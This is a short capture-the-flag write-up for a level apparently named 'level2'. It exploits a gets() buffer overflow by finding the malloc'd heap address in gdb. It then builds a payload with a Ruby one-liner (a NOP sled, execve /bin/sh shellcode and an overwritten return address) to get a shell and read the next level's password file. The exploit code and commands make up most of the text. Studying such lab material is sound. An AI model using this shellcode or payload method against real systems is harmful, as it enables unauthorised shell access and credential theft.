In this binary we can see that the 'gets' function is used again.
We will use buffer overflow to create asm binary code that will execute a shell and overwrite the EIP to call this code.
The binary code found to launch a shell is "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
We will add some NOP ('\x90') operators to fill the buffer.
Then we will pass the address that will contain the execution of /bin/sh.
To find it we will use gdb :
    $ gdb -q ./level2
    (gdb) run
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
    info registers

We can see that register eax address is '0x804a008' which will be passed as '"\x08\xa0\x04\x08".
For malloc, eax is the return value.

Then we create a file using the previous informations :
    $ ruby -e 'print "\x90" * 35 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x08\xa0\x04\x08"' > /tmp/buffer_overload
    $ cat /tmp/buffer_overload - | ./level2
    cat /home/user/level3/.pass